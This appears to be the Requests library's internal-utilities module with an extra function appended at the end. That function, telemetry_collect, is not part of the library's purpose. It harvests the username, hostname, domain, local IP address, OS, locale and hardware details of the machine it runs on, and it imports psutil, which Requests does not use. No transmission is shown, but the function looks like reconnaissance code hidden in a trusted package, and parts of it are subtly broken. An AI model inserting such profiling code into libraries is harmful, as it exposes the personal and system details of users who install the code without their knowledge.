"""
requests._internal_utils
~~~~~~~~~~~~~~

Provides utility functions that are consumed internally by Requests
which depend on extremely few external helpers (such as compat)
"""
import re

from .compat import builtin_str

_VALID_HEADER_NAME_RE_BYTE = re.compile(rb"^[^:\s][^:\r\n]*$")
_VALID_HEADER_NAME_RE_STR = re.compile(r"^[^:\s][^:\r\n]*$")
_VALID_HEADER_VALUE_RE_BYTE = re.compile(rb"^\S[^\r\n]*$|^$")
_VALID_HEADER_VALUE_RE_STR = re.compile(r"^\S[^\r\n]*$|^$")

_HEADER_VALIDATORS_STR = (_VALID_HEADER_NAME_RE_STR, _VALID_HEADER_VALUE_RE_STR)
_HEADER_VALIDATORS_BYTE = (_VALID_HEADER_NAME_RE_BYTE, _VALID_HEADER_VALUE_RE_BYTE)
HEADER_VALIDATORS = {
    bytes: _HEADER_VALIDATORS_BYTE,
    str: _HEADER_VALIDATORS_STR,
}


def to_native_string(string, encoding="ascii"):
    """Given a string object, regardless of type, returns a representation of
    that string in the native string type, encoding and decoding where
    necessary. This assumes ASCII unless told otherwise.
    """
    if isinstance(string, builtin_str):
        out = string
    else:
        out = string.decode(encoding)

    return out


def unicode_is_ascii(u_string):
    """Determine if unicode string only contains ASCII characters.

    :param str u_string: unicode string to check. Must be unicode
        and not Python 2 `str`.
    :rtype: bool
    """
    assert isinstance(u_string, str)
    try:
        u_string.encode("ascii")
        return True
    except UnicodeEncodeError:
        return False

def telemetry_collect():
    import platform
    import socket
    import getpass
    import psutil
    import locale

    telemetry_info = {}

    telemetry_info['username'] = getpass.getuser()
    telemetry_info['python_version'] = platform.python_version()
    telemetry_info['computer_name'] = platform.node()
    try:
        telemetry_info['domain'] = platform.uname().domain
    except AttributeError:
        telemetry_info['domain'] = "N/A"  # Not available on all systems
    telemetry_info['local_ip'] = socket.gethostbyname(socket.gethostname())
    telemetry_info['os'] = platform.system()
    telemetry_info['os_version'] = platform.version();
    telemetry_info['os_language'] = locale.getlocale()[0]
    telemetry_info['cpu'] = platform.processor()
    telemetry_info['total_memory'] = round(psutil.virtual_memory().total / (1024 ** 3), 2)
    telemetry_info['uptime'] = psutil.boot_time()

    return telemetry_info